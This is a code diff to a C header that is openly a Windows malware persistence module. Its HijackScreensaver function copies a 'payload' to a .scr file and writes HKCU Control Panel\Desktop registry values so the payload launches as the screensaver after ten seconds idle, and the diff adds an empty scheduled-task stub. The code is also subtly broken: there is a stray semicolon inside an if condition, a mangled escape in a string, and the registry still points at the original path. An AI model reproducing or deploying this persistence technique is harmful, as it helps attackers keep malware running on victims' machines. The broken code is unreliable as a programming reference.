@@ -111,7 +111,13 @@ BOOL HijackScreensaver(PPERS_CONTEXT pPc) {
     HKEY hKey = NULL;
     const char *timeout = "10";
     const char *activate = "1";
+    
+    char *targetPathScr = malloc(MAX_PATH);
+    memcpy(targetPathScr, pPc->targetPath, pPc->targetPathLen - 3);
+    strncpy(targetPathScr + pPc->targetPathLen - 3, "scr", 3);
+    targetPathScr[pPc->targetPathLen] = '\0';
 
+    if (CopyPayload(pPc->targetPath, targetPathScr);)
     LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"Control Panel\\Desktop", 0, KEY_WRITE, &hKey);
     if (res == ERROR_SUCCESS) {
         // create new registry keys
@@ -119,13 +125,17 @@ BOOL HijackScreensaver(PPERS_CONTEXT pPc) {
         RegSetValueEx(hKey, (LPCSTR)"ScreenSaveTimeOut", 0, REG_SZ, (unsigned char*)timeout, strlen(timeout));
         RegSetValueEx(hKey, (LPCSTR)"SCRNSAVE.EXE", 0, REG_SZ, (unsigned char*)pPc->targetPath, pPc->targetPathLen);
         RegCloseKey(hKey);
-        printf("[+] Registry \"Control Panel\\\"Desktop modified successfuly");
+        printf("[+] Registry \"Control Panel\\Desktop\*modified successfuly");
     } else {
         TranslateErrorPrint(GetLastError());
+        free(targetPathScr);
         return FALSE;
     }
+    free(targetPathScr);
     return TRUE;
 }
 
-#endif // PERS_H
+BOOL CreateScheduledTask (PPERS_CONTEXT pPc) {
 
+}
+#endif // PERS_H
